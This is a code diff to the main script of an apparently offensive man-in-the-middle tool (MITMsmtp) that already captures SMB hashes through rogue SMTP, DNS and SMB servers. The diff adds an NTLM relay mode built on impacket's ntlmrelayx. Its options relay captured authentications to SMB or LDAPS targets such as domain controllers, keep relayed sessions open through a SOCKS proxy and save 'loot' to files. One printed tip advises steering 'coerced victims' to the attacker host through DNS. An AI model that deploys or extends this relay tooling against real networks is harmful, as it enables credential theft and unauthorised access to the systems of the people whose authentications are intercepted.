@@ -4,6 +4,7 @@ from SMTPServer import ThreadedSMTPServer
 from SMTPHandler import SMTPHandler
 from DNSServer import DNSServer
 from SMBServer import SMBServer
+from relay import NTLMRelay
 import threading
 import os
 import argparse
@@ -178,15 +179,60 @@ def main():
     parser.add_argument('--smb-log', help='Directory to append captured SMB hashes to (smb_credentials.log)')
     parser.add_argument('--print-smb', action='store_true', help='Print SMB protocol activity')
 
+    # NTLM relay options (delegates to impacket's ntlmrelayx; install with: pip install impacket)
+    parser.add_argument('--relay', action='store_true', help='Enable NTLM relay mode via impacket ntlmrelayx (mutually exclusive with --enable-smb; ntlmrelayx owns port 445)')
+    parser.add_argument('--relay-target', action='append', metavar='TARGET', help='Relay target, e.g. smb://10.0.0.5 or ldaps://dc01 (repeatable)')
+    parser.add_argument('--relay-targets-file', help='File of relay targets, one per line (ntlmrelayx -tf)')
+    parser.add_argument('--relay-no-smb2support', action='store_true', help='Do not pass -smb2support to ntlmrelayx (SMB2 support is on by default)')
+    parser.add_argument('--relay-ip', help='IP for ntlmrelayx to bind its listeners to (ntlmrelayx -ip)')
+    parser.add_argument('--relay-socks', action='store_true', help='Start the ntlmrelayx SOCKS proxy to reuse relayed sessions (-socks)')
+    parser.add_argument('--relay-output-prefix', help='File prefix for ntlmrelayx loot output (-of)')
+    parser.add_argument('--relay-extra', help='Raw extra arguments passed verbatim to ntlmrelayx (quoted string)')
+    parser.add_argument('--relay-bin', help='Path to ntlmrelayx(.py) if not auto-detected on PATH')
+    parser.add_argument('--relay-dry-run', action='store_true', help='Print the ntlmrelayx command that would be run, then exit')
+
     args = parser.parse_args()
-    
+
     # Set up signal handler for graceful shutdown
     signal.signal(signal.SIGINT, signal_handler)
-    
+
+    # Validate relay options (ntlmrelayx owns port 445, so it can't coexist
+    # with our own SMB server).
+    if args.relay and args.enable_smb:
+        print("[ERROR] --relay and --enable-smb are mutually exclusive: ntlmrelayx binds port 445 itself.")
+        print("[HINT] Use --relay to relay live, or --enable-smb to capture hashes for offline cracking.")
+        sys.exit(1)
+
+    # Initialize NTLM relay (impacket ntlmrelayx) if enabled
+    relay = None
+    if args.relay:
+        try:
+            relay = NTLMRelay(
+                targets=args.relay_target,
+                targets_file=args.relay_targets_file,
+                smb2support=not args.relay_no_smb2support,
+                interface_ip=args.relay_ip,
+                socks=args.relay_socks,
+                output_prefix=args.relay_output_prefix,
+                extra_args=args.relay_extra,
+                binary=args.relay_bin,
+            )
+        except ValueError as e:
+            print(f"[RELAY ERROR] {e}")
+            sys.exit(1)
+
+        if args.relay_dry_run:
+            cmd = relay.build_command(allow_tempfile=False)
+            print("[RELAY] Command that would be run:")
+            print("    " + " ".join(cmd))
+            if not NTLMRelay.impacket_installed() and relay.find_binary() is None:
+                print("[RELAY] NOTE: impacket/ntlmrelayx not detected. Install with: pip install impacket")
+            sys.exit(0)
+
     # Create handlers
     auth_handler = AuthHandler()
     message_handler = SimpleMessageHandler()
-    
+
     # Initialize DNS server if enabled
     dns_server = None
     if args.enable_dns:
@@ -262,6 +308,16 @@ def main():
                     print("[SMB HINT] Port 445 requires root privileges and must not be in use. Try: sudo python MITMsmtp.py ...")
                 sys.exit(1)
 
+        # Start NTLM relay (if enabled)
+        if relay:
+            try:
+                relay.start()
+                print("[RELAY] Relaying captured authentications to the configured target(s)")
+                print("[RELAY] Tip: pair with --enable-dns so coerced victims resolve to this host")
+            except Exception as e:
+                print(f"[RELAY ERROR] Failed to start relay: {e}")
+                sys.exit(1)
+
         # Start SMTP server
         print(f"[SMTP] Starting SMTP server on {args.server_address}:{args.port}")
         if args.STARTTLS:
@@ -295,6 +351,8 @@ def main():
                 dns_server.stop()
             if smb_server:
                 smb_server.stop()
+            if relay:
+                relay.stop()
             mitm_server.stop()
             print("[INFO] All servers stopped")
         except:
